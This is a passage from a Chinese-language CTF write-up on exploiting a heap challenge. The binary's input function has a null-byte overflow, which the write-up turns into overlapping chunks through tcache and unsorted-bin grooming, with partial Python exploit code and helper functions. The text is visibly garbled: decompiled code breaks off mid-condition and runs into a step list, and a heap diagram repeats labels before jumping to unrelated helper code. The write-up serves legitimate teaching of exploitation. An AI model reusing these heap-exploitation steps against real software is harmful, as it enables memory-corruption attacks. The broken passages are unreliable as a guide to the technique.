    NX:       NX enabled
    PIE:      PIE enabled
```
##### 基本功能
0. 输入函数：循环读入一个字节，如果出现 null 字节或是换行符则停止读入，之后对当前读入的末尾位置和 size 位置进行置零操作。
1. new: 使用 `malloc(0xa8)` 分配一个块，记录下 size ，输入内容。
2. free: 首先根据记录下的 size 对堆块进行 `memset` 清零，之后进行常规 free
3. show：使用 puts 进行输出
功能较为简单。
记录一个 chunk 结构的结构体：
```c
struct Chunk {
    char *content;
    int size;
};
```
使用了一个在堆上分配的结构来记录所有 `Chunk` 结构体，一共可以分配 10 个块。
程序的读入输入函数存在一个 null-byte-overflow 漏洞 ，具体见如下代码
```c
unsigned __int64 __fastcall read_input(_BYTE *malloc_p, int sz)
{
  unsigned int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
  v4 = __readfsqword(0x28u);
  i = 0;                                        
  if ( sz )
  {
    while ( 1 )
    {
      read(0, &malloc_p[i], 1uLL);
      if ( sz - 1  B -> C` 三块 unsorted bin chunk 依次进行释放
2. A 和 B 合并，此时 C 前的 prev_size 写入为 0x200
3. A  、 B  、 C 合并，步骤 2 中写入的 0x200 依然保持
4. 利用 unsorted bin 切分，分配出 A 
5. 利用 unsorted bin 切分，分配出 B，注意此时不要覆盖到之前的 0x200
6. 将 A 再次释放为 unsorted bin 的堆块，使得 fd 和 bk 为有效链表指针
7. 此时 C 前的 prev_size 依然为 0x200（未使用到的值），A B C 的情况： `A (free) -> B (allocated) -> C (free)`，如果使得 B 进行溢出，则可以将已分配的 B 块包含在合并后的释放状态 unsorted bin 块中。
但是在这个过程中需要注意 tcache 的影响。
##### 利用步骤
###### 重排堆块结构，释放出 unsorted bin chunk
由于本题只有 10 个可分配块数量，而整个过程中我们需要用到 3 个 unsorted bin 的 chunk ，加上 7 个 tcache 的 chunk ，所以需要进行一下重排，将一个 tcache 的 chunk 放到 3 个 unsorted bin chunk 和 top chunk 之间，否则会触发 top 的合并。
```python
    # step 1: get three unsortedbin chunks
    # note that to avoid top consolidation, we need to arrange them like:
    # tcache * 6 -> unsortd  * 3 -> tcache
    for i in range(7):
        new(0x10, str(i) + ' - tcache')
    for i in range(3):
        new(0x10, str(i + 7) + ' - unsorted') # three unsorted bin chunks
    # arrange:
    for i in range(6):
        delete(i)
    delete(9)
    for i in range(6, 9):
        delete(i)
```
重分配后的堆结构：
```
+-----+
|     |  一个大 free 块
+-----+                             |
|  C  |  一个大 free 块
+-----+                             |
|  C  | ')
    p.sendline(str(idx))
def new(size, content):
    cmd(1)
    p.recvuntil('>')
    p.sendline(str(size))
    p.recvuntil('> ')